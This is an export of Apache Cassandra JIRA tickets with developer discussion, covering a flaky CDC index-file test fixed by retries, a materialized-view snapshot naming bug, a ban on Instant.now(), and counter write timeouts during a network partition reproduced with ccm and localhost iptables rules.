I have an alternative [PR|https://github.com/apache/cassandra/pull/1777/files#] which fixes the issue maintaining the original behavior. The explanation being the the call to get the lock the second time [here|https://github.com/apache/cassandra/pull/1777/files#diff-01005beb5774536671b8fed6d3f6b57c90d837257da7581ac12807c234140043R92] may return null if the autoclosable [here|https://github.com/apache/cassandra/pull/1777/files#diff-01005beb5774536671b8fed6d3f6b57c90d837257da7581ac12807c234140043R66] hasn't completed and released the lock in time. Adding a latch to catch that event fixes the test for me.

[PR 4.0|https://github.com/apache/cassandra/pull/1777/files#] and [CI|https://app.circleci.com/pipelines/github/bereng/cassandra/723/workflows/dbc40298-6c42-42af-8e4c-9d0c07d2e314/jobs/6507] + local repro of bug/fix

Wdyt makes sense? Do you want to create the 4.1, trunk PRs and test them locally or do you prefer I take over?;;;","16/Aug/22 16:35;brandon.williams;This fell off my radar, but your PR looks good [~Bereng] if you want to create the other branches and we can close this out.;;;","17/Aug/22 08:29;bereng;Yep I was waiting for tomorrow, which would be the 1 month mark without any movement, to take it. So I pushed PRs, repro'ed locally the fix and ran only junit on all branches as I don't think we need to hammer circle 10K per branch having the local repro already. If you +1 I'll commit.;;;","17/Aug/22 10:36;brandon.williams;SGTM, +1.;;;","18/Aug/22 07:41;bereng;Committed. Thanks [~brandon.williams] for the review and [~skokoori] for the pointers, I added you as a co-author :-);;;","06/Sep/22 21:05;skokoori;[~bereng] , I was on vacation and did not see your previous comment. Thank you for resolving the issue;;;","07/Sep/22 04:46;bereng;My pleasure!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testCDCIndexFileWriteOnSync,CASSANDRA-17416,13431877,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,yifanc,marcuse,marcuse,04/Mar/22 07:13,27/May/22 19:25,13/Jul/23 08:40,06/May/22 18:37,4.1,4.1-alpha1,,,,,Test/unit,,,,0,,"[https://ci-cassandra.apache.org/job/Cassandra-trunk/985/testReport/org.apache.cassandra.db.commitlog/CommitLogSegmentManagerCDCTest/testCDCIndexFileWriteOnSync_cdc_3/]
h3. Error Message

expected:<1748956> but was:<1749196>
h3. Stacktrace

junit.framework.AssertionFailedError: expected:<1748956> but was:<1749196> at org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testCDCIndexFileWriteOnSync(CommitLogSegmentManagerCDCTest.java:160) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
h3. Standard Output

INFO [main] 2022-03-02 15:04:59,516 YamlConfigurationLoader.java:103 - Configuration location: file:////home/cassandra/cassandra/build/test/cassandra.cdc.yaml DEBUG [main] 2022-03-02 15:04:59,520 YamlConfigurationLoader.java:124 - Loading settings from file:////home/cassandra/cassandra/build/test/cassandra.cdc.yaml INFO [main] 2022-03-02 15:04:59,674 Config.java:907 - Node configuration:[allocate_tokens_for_keyspace=null; allocate_tokens_for_local_replication_factor=null; allow_extra_insecure_ ...[truncated 4125855 chars]... -02 15:06:57,491 PathUtils.java:73 - Deleting file during startup: /home/cassandra/cassandra/build/test/cassandra/data/system_schema/views-9786ac1cdd583201a7cdad556410c985/nb-11-big-Summary.db DEBUG [MemtableFlushWriter:2] 2022-03-02 15:06:57,496 ColumnFamilyStore.java:1207 - Flushed to [BigTableReader(path='/home/cassandra/cassandra/build/test/cassandra/data/system_schema/keyspaces-abac5682dea631c5b535b3d6cffd0fb6/nb-55-big-Data.db')] (1 sstables, 4.895KiB), biggest 4.895KiB, smallest 4.895KiB",,e.dimitrova,jmckenzie,maedhroz,marcuse,yifanc,,,,,,,,,,"josh-mckenzie commented on code in PR #1605:
URL: https://github.com/apache/cassandra/pull/1605#discussion_r866942204


##########
test/unit/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDCTest.java:
##########
@@ -157,11 +157,25 @@ public void testCDCIndexFileWriteOnSync() throws IOException
         Assert.assertTrue(""Index file not written: "" + cdcIndexFile, cdcIndexFile.exists());
 
         // Read index value and confirm it's == end from last sync
-        BufferedReader in = new BufferedReader(new FileReader(cdcIndexFile));
-        String input = in.readLine();
-        Integer offset = Integer.parseInt(input);
-        Assert.assertEquals(syncOffset, (long)offset);
-        in.close();
+        String input = null;
+        // There could be a race between index file update (truncate & write) and read. See CASSANDRA-17416
+        // It is possible to read an empty line. In this case, re-try at most 5 times.
+        for (int i = 0; input == null && i < 5; i++)
+        {
+            try (BufferedReader in = new BufferedReader(new FileReader(cdcIndexFile)))

Review Comment:
   Worth putting a small sleep in here to give the system the wiggle room to allow the scheduler to put the index file writing thread back on the stack and write the file out instead of just spinning on it 5 times?



;06/May/22 15:30;githubbot;600","yifan-c closed pull request #1605: CASSANDRA-17416: Test Failure: org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testCDCIndexFileWriteOnSync
URL: https://github.com/apache/cassandra/pull/1605


;06/May/22 21:29;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,yifanc,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue May 10 16:54:30 UTC 2022,,,,,,,All,,,,"0|z105mo:",9223372036854775807,,,,jmckenzie,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/c48906394e01460382f4070ecc34f6f9754fc567,,,,,,,,,"unit test; CI",,,,,"30/Mar/22 02:47;e.dimitrova;I don't see a reason for this one to stay in triage, I keep on seeing it on trunk;;;","01/Apr/22 17:19;e.dimitrova;I just saw this stacktrace in [here|https://ci-cassandra.apache.org/job/Cassandra-trunk/1044/testReport/org.apache.cassandra.db.commitlog/CommitLogSegmentManagerCDCTest/testCDCIndexFileWriteOnSync_cdc_2/] 

{code:java}
Regression
org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testCDCIndexFileWriteOnSync-cdc (from org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest-cdc)

Failing for the past 1 build (Since #1044 )
Took 2.1 sec.
 Failed 2 times in the last 30 runs. Flakiness: 10%, Stability: 93%
Error Message
null
Stacktrace
java.lang.NumberFormatException: null
	at java.lang.Integer.parseInt(Integer.java:542)
	at java.lang.Integer.parseInt(Integer.java:615)
	at org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testCDCIndexFileWriteOnSync(CommitLogSegmentManagerCDCTest.java:159)
{code}
;;;","02/May/22 19:12;jmckenzie;Can't reproduce this one locally but noodling on it for a bit, here's a hypothesis:
{code}
        CommitLog.instance.sync(true);
        CommitLogSegment currentSegment = CommitLog.instance.segmentManager.allocatingFrom();
        int syncOffset = currentSegment.lastSyncedOffset;

        // Confirm index file is written
        File cdcIndexFile = currentSegment.getCDCIndexFile();
        Assert.assertTrue(""Index file not written: "" + cdcIndexFile, cdcIndexFile.exists());

        // Read index value and confirm it's == end from last sync
        BufferedReader in = new BufferedReader(new FileReader(cdcIndexFile));
{code}

In general, to my eye the above code is going to be prone to races. The syncOffset we take immediately after sync + getting ref may or may not point to whatever is in the cdcIndexFile as another flush / sync may go on between that first lastSyncedOffset check and creation of the FileReader.

So I'm thinking we check that the value we parse from cdcIndexFile is >= lastSyncedOffset to account for that.

As for the null you saw Ekaterina, no clue. That null indicates it failed to read anything from the cdcIndexFile and it really shouldn't have done that; can't think of a scenario where it'd succeed in writing the index file but have it be completely empty. I can harden that test a bit and have it dump out the entire contents of the index file if it has an integer parse error.

[~yifanc] - since you've dug around a bit in the CDC space, WDYT about the >= comparison instead of equality here? Sound reasonable?
 ;;;","02/May/22 19:22;e.dimitrova;Hey [~jmckenzie] Note on the reproducibility. I see these failures all the time with midres in CircleCI. You can use the jobs to loop it there and you will have the logs under artifacts. It is super convenient. Hope that helps :) ;;;","02/May/22 20:35;e.dimitrova;For the record, this is a loop on recent trunk where we can see both failures and respective logs from CircleCI:

[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1557/workflows/a1508c6d-7d81-4f05-b6bf-e763ca73d4d0/jobs/10300];;;","03/May/22 05:38;yifanc;I was able to reproduce the both failures. Some logging changes was made to the test and it helped to indicate the cause. Please see the test failures in [this repeated run|https://app.circleci.com/pipelines/github/yifan-c/cassandra/337/workflows/5a42b3bc-c540-4c36-aac4-7a22709cf75b/jobs/2808]

For the unequal expected and actual offset values, [~jmckenzie]'s analysis is correct. The completed tasks from the commit log metrics between the explicit commit log sync call and reading the index file are different for the failed tests. It means there is another mutation added to the commit log. 

For reading the null value, I believe the cause is the race between overwriting and reading the CDC index file. Overwriting a file (as for the one opened with PathUtils#newWriteOverwriteChannel) has 2 steps:
1. Truncate the file to size of 0.
2. Write the offset (long). 
It is possible that the test reads the file when the file is just truncated, hence getting the null value. I also have an independent unit test to reproduce the behavior. It inserts a pause between creating the file writer (which truncates) and writing content. The other thread that reads the file throws NPE. 
Since the overwrite operation is non-atomic, NPE is possible to happen when CDC consumers read the index file. I think we should either document the behavior or make the update atomic. I would lean to the former for simplicity and re-reading the file is going to give the correct content. WDYT?;;;","03/May/22 15:53;jmckenzie;bq. I think we should either document the behavior or make the update atomic. I would lean to the former for simplicity and re-reading the file is going to give the correct content. WDYT?
+1 to documenting the nuance of the API and we can also have the unit test pause a bit and retry N times, throwing a specific exception about the expectation (we expected race w/new file write to lead to us being able to read a new file after retry but got null N times) in there.

While still *technically* there's surface area to flake w/that, it should be a vanishingly small pct chance if we retry 100 times with 20ms sleeps and we can give a very direct guide as to why it failed.

I'm happy to make both these changes and push up a PR. Thanks for checking and confirming [~yifanc] (as well as checking into Ekaterina's other observed failure pattern);;;","05/May/22 21:30;yifanc;Talked with Josh offline and I am posting the patch. It makes changes to the test and documents the edge case when reading from the CDC index file.

PR: [https://github.com/apache/cassandra/pull/1605]
[J8 (repeated)|https://app.circleci.com/pipelines/github/yifan-c/cassandra/339/workflows/4798541d-1cdc-4ac3-bd18-81ea18b6874b/jobs/2813]: Green
[J11 (repeated)|https://app.circleci.com/pipelines/github/yifan-c/cassandra/339/workflows/157cac9e-58b5-4414-a9d0-ca289efb7c3d/jobs/2814]: Green;;;","06/May/22 15:32;jmckenzie;One question but I'm a +1 pending that: currently the test just spins 5 times to try and read the index file. I think adding a very small sleep (20ms for example) between each attempt to read would make this a bit more robust as that'd give the kernel scheduler more chances to put the CDC index file writer to the front of the queue to execute for our next read.

Based on your opinion of the above, CI looks good and the patch looks good. So take it or leave it on commit.

Thanks for grabbing this Yifan!;;;","06/May/22 16:38;yifanc;Addressed the feedback (add pause between each read attempt) and started a new [repeated run|https://app.circleci.com/pipelines/github/yifan-c/cassandra/340/workflows/06684382-3087-4c54-9e33-8089b73150b1];;;","06/May/22 18:37;yifanc;Committed into trunk as [c48906|https://github.com/apache/cassandra/commit/c48906394e01460382f4070ecc34f6f9754fc567];;;","07/May/22 00:29;e.dimitrova;Hey [~yifanc] , I think you forgot to commit the fix to our brand new cassandra-4.1 branch :D ;;;","09/May/22 22:30;yifanc;Thank you, Ekaterina! 
Just cherrypicked the commit to 4.1 and started the repeated run: https://app.circleci.com/pipelines/github/yifan-c/cassandra/342/workflows/9d751a4e-52bd-45f4-8b12-13b451b12080;;;","10/May/22 01:01;yifanc;The repeated run is green. 
Pushed the [commit to 4.1|https://github.com/apache/cassandra/commit/8fc39685fbb6c963cf0d86fd458069ab80bbcece] and merged up to trunk. ;;;","10/May/22 01:12;e.dimitrova;Great! Thanks [~yifanc] :-) ;;;","10/May/22 16:54;jmckenzie;ASF CI run seems like a bit of an unrelated mess. Probably need to see how build 11 w/a subsequent commit runs, as a lot of unrelated failures popped up for seemingly first time in the 4.1 history on this patch.

A limitation of the logic used to determine historical test failure here is that we're comparing the 10 builds of the cassandra-4.1 branch and missing out on trunk so it's quite possible there's failures of these tests on those branches as well not being correlated here.

I don't think there's anything for us to do re: CI and this patch though.

[CI Results]
Branch: 4.1, build number: 10
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/10/]
JIRA: CASSANDRA-17416
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=8fc39685fbb6c963cf0d86fd458069ab80bbcece]
affected paths:
 * doc/modules/cassandra/pages/operating/cdc.adoc
 * test/unit/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDCTest.java

Build Result: UNSTABLE
Passing Tests: 49062
Failing Tests: 16
||Test|Failures|JIRA|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl|2 of 8|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestProtoV3Upgrade*%22]|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome|2 of 8|CASSANDRA-17301?|
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability|2 of 8|CASSANDRA-17307?|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable-compression|2 of 8|CASSANDRA-17455?|
|org.apache.cassandra.distributed.test.thresholds.TombstoneCountWarningTest.noWarningsScan|1 of 8|CASSANDRA-17244?|
|dtest-upgrade.upgrade_tests.cql_tests.TestCQLNodes3RF3_Upgrade_current_3_0_x_To_indev_4_1_x.test_multi_in_compact|1 of 8|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-offheap.auth_test.TestAuth.test_system_auth_ks_is_alterable|1 of 8|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestAuth*%22]|
|org.apache.cassandra.distributed.test.thresholds.TombstoneCountWarningTest.failThresholdSinglePartition|2 of 8|CASSANDRA-17244?|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable-cdc|1 of 8|CASSANDRA-17455?|
|org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionCollectionsTest.testNonFrozenEmptyCollection[1: clusterMinVersion=3.11]|1 of 8|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest.materialized_views_test.TestMaterializedViews.test_mv_with_default_ttl_with_flush|1 of 8|CASSANDRA-11612?|
|org.apache.cassandra.distributed.test.thresholds.TombstoneCountWarningTest.noWarningsSinglePartition|1 of 8|CASSANDRA-17244?|
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSwitchingCDCWriteModes|2 of 8|CASSANDRA-17542?|
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRowDeletionTie-compression|2 of 8|CASSANDRA-17463?|
|org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionCollectionsTest.testListItem[1: clusterMinVersion=3.11]-cdc|1 of 8|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.cql_tests.TestCQLNodes3RF3_Upgrade_indev_3_0_x_To_indev_4_1_x.test_no_range_ghost|1 of 8|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
dropping of a materialized view does not create a snapshot with dropped- prefix,CASSANDRA-17415,13431751,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,smiklosovic,smiklosovic,03/Mar/22 15:19,09/Mar/22 10:59,13/Jul/23 08:40,08/Mar/22 16:46,3.11.13,,,,,,Feature/Materialized Views,,,,0,snapshots,"When auto_snapshot: true and MV is dropped, the name of the snapshot does not start with ""dropped-"" prefix as a normal table would. This is an issue for 3.11.x only. In 4.x, the code was refactored a lot and it does not happen there.",,paulo,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 08 13:27:12 UTC 2022,,,,,,,All,,,,"0|z104uo:",9223372036854775807,,,,paulo,,,,Low,,NA,,https://github.com/apache/cassandra/commit/8def4fd7fb5fd73cb06e66381c3de3b99e397f07,,,,,,,,,unit test,,,,,"04/Mar/22 09:49;smiklosovic;https://github.com/apache/cassandra/pull/1483

https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1470/;;;","08/Mar/22 13:27;paulo;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Block usage of Instant.now(),CASSANDRA-17414,13431648,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,marcuse,marcuse,03/Mar/22 08:05,07/Mar/23 11:52,13/Jul/23 08:40,09/Mar/22 10:20,4.1,4.1-alpha1,,,,,Build,,,,0,,After CEP-10 we should avoid using Instant.now(),,benedict,maedhroz,marcuse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Code -> Bug - Unclear Impact,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Mar 09 10:20:06 UTC 2022,,,,,,,All,,,,"0|z1047s:",9223372036854775807,,,,benedict,,,,Low,,5.0,,https://github.com/apache/cassandra/commit/60675cc2759db0c5629604279e70c51e10dfefd6,,,,,,,,,cci run,,,,,"03/Mar/22 08:10;marcuse;[https://github.com/apache/cassandra/pull/1477]
[https://app.circleci.com/pipelines/github/krummas/cassandra/785/workflows/04492fa1-5579-47d1-abcf-dbf72e09828e];;;","03/Mar/22 11:30;benedict;+1;;;","09/Mar/22 10:20;marcuse;committed, thanks!

One failure in the test run above, handled in CASSANDRA-17139

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Network partition causes write ONE timeouts when using counters in Cassandra 4,CASSANDRA-17411,13431300,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,pbalaguer,pbalaguer,01/Mar/22 15:33,05/Oct/22 22:22,13/Jul/23 08:40,16/Jun/22 14:07,4.0.5,4.1,4.1-beta1,,,,Consistency/Coordination,,,,0,,"h5. Affected versions:
 * 4.x

h5. Observed behavior:

When executing CL=ONE writes on a table with a counter column, if one of the nodes is network partitioned from the others, clients keep sending requests to it.

Even though this may be a ""driver"" problem, I've been able to reproduce it with both java and python datastax drivers using their latest available versions and given the behavior only changes depending on the Cassandra version, well, here I am.

h5. Expected behavior:

In Cassandra 3 after all inflight requests fail (expected), no new requests are sent to the partitioned node. The expectation is that Cassandra 4 behaves the same way.

h5. How to reproduce:

{noformat}
# Create a cluster with the desired version, will go with 4.x for this example
ccm create bug-report -v 4.0.3
ccm populate -n 2:2:2
ccm start

# Create schemas and so on
CQL=$(cat <<END
CONSISTENCY ALL;
DROP KEYSPACE IF EXISTS demo;
CREATE KEYSPACE demo WITH REPLICATION = {'class': 'NetworkTopologyStrategy', 'dc1': 2, 'dc2': 2, 'dc3': 2};
CREATE TABLE demo.demo (pk uuid PRIMARY KEY, count counter) WITH compaction = {'class': 'LeveledCompactionStrategy'};
END
)
ccm node1 cqlsh --verbose --exec=""${CQL}""

# Launch the attached app.py
# requires cassandra-driver
python3 app.py ""127.0.0.1"" ""9042""

# Wait a bit for the app to settle, proceed to next step once you see 3 messages in stdout like:
# 2022-03-01 15:41:51,557 - target-dc2 - __main__ - INFO - Got 0/572 (0.000000) timeouts/total_rqs in the last 1 minute

# Partition one node with iptables
iptables -A INPUT -p tcp --destination 127.0.0.1 --destination-port 7000 -j DROP; iptables -A INPUT -p tcp --destination 127.0.0.1 --destination-port 9042 -j DROP
{noformat}
Some time after executing the iptables command in cassandra-3 the output should be similar to:
{noformat}
2022-03-01 15:41:51,557 - target-dc2 - __main__ - INFO - Got 0/572 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:41:51,576 - target-dc3 - __main__ - INFO - Got 0/572 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:41:58,032 - target-dc1 - __main__ - INFO - Got 6/252 (2.380952) timeouts/total_rqs in the last 1 minute
2022-03-01 15:42:51,560 - target-dc2 - __main__ - INFO - Got 0/570 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:42:51,620 - target-dc3 - __main__ - INFO - Got 0/570 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:42:58,101 - target-dc1 - __main__ - INFO - Got 2/354 (0.564972) timeouts/total_rqs in the last 1 minute
2022-03-01 15:43:51,602 - target-dc2 - __main__ - INFO - Got 0/571 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:43:51,672 - target-dc3 - __main__ - INFO - Got 0/571 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:43:58,153 - target-dc1 - __main__ - INFO - Got 0/572 (0.000000) timeouts/total_rqs in the last 1 minute
{noformat}
as the timeouts/rqs shows, in about 2 minutes the partitioned node stops receiving traffic

while as in cassandra-4
{noformat}
2022-03-01 15:49:39,068 - target-dc3 - __main__ - INFO - Got 0/566 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:49:39,107 - target-dc2 - __main__ - INFO - Got 0/566 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:49:41,206 - target-dc1 - __main__ - INFO - Got 2/444 (0.450450) timeouts/total_rqs in the last 1 minute
2022-03-01 15:50:39,095 - target-dc3 - __main__ - INFO - Got 0/569 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:50:39,148 - target-dc2 - __main__ - INFO - Got 0/569 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:50:42,589 - target-dc1 - __main__ - INFO - Got 7/13 (53.846154) timeouts/total_rqs in the last 1 minute
2022-03-01 15:51:39,125 - target-dc3 - __main__ - INFO - Got 0/567 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:51:39,159 - target-dc2 - __main__ - INFO - Got 0/567 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:51:44,902 - target-dc1 - __main__ - INFO - Got 12/22 (54.545455) timeouts/total_rqs in the last 1 minute
2022-03-01 15:52:39,188 - target-dc2 - __main__ - INFO - Got 0/567 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:52:39,202 - target-dc3 - __main__ - INFO - Got 0/568 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:52:46,994 - target-dc1 - __main__ - INFO - Got 12/20 (60.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:53:39,202 - target-dc2 - __main__ - INFO - Got 0/568 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:53:39,238 - target-dc3 - __main__ - INFO - Got 0/568 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:53:48,765 - target-dc1 - __main__ - INFO - Got 12/17 (70.588235) timeouts/total_rqs in the last 1 minute
2022-03-01 15:54:39,203 - target-dc2 - __main__ - INFO - Got 0/568 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:54:39,291 - target-dc3 - __main__ - INFO - Got 0/568 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:54:51,291 - target-dc1 - __main__ - INFO - Got 12/24 (50.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:55:39,258 - target-dc2 - __main__ - INFO - Got 0/570 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:55:39,327 - target-dc3 - __main__ - INFO - Got 0/570 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-01 15:55:53,365 - target-dc1 - __main__ - INFO - Got 12/20 (60.000000) timeouts/total_rqs in the last 1 minute
{noformat}
as the timeouts/rqs shows, the partitioned node keeps receving traffic until the iptables rules are removed",,absurdfarce,adelapena,brandon.williams,e.dimitrova,jeromatron,jmckenzie,maedhroz,pbalaguer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Mar/22 15:33;pbalaguer;app.py;https://issues.apache.org/jira/secure/attachment/13040598/app.py",,,,,1.0,brandon.williams,,,,,,,,,,,,,,Availability,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jun 28 10:33:51 UTC 2022,,,,,,,All,,,,"0|z10234:",9223372036854775807,,,,adelapena,,,,Normal,,4.0-alpha1,,https://github.com/apache/cassandra/commit/51ce71881c87df754969809b5f6b2a466abc1e35,,,,,,,,,add test and run CI,,,,,"23/Mar/22 20:43;brandon.williams;Following these steps, I received:

{noformat}
2022-03-23 20:36:12,259 - target-dc3 - __main__ - INFO - Got 0/552 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:36:12,265 - target-dc1 - __main__ - INFO - Got 0/553 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:36:12,348 - target-dc2 - __main__ - INFO - Got 0/552 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:37:12,276 - target-dc3 - __main__ - INFO - Got 0/569 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:37:12,337 - target-dc1 - __main__ - INFO - Got 0/569 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:37:12,432 - target-dc2 - __main__ - INFO - Got 0/569 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:38:12,282 - target-dc3 - __main__ - INFO - Got 0/575 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:38:12,415 - target-dc1 - __main__ - INFO - Got 0/575 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:38:12,456 - target-dc2 - __main__ - INFO - Got 0/575 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:39:12,373 - target-dc3 - __main__ - INFO - Got 0/577 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:39:12,556 - target-dc2 - __main__ - INFO - Got 0/578 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:39:16,284 - target-dc1 - __main__ - INFO - Got 1/565 (0.176991) timeouts/total_rqs in the last 1 minute
2022-03-23 20:39:42,083 - target-dc3 - cassandra.connection - WARNING - Heartbeat failed for connection (139909259222464) to 127.0.0.1:9042
2022-03-23 20:39:42,106 - target-dc1 - cassandra.connection - WARNING - Heartbeat failed for connection (139909259218800) to 127.0.0.1:9042
2022-03-23 20:39:42,149 - target-dc2 - cassandra.connection - WARNING - Heartbeat failed for connection (139909259222224) to 127.0.0.1:9042
2022-03-23 20:39:47,113 - target-dc1 - cassandra.cluster - WARNING - [control connection] Error connecting to 127.0.0.1:9042:
Traceback (most recent call last):
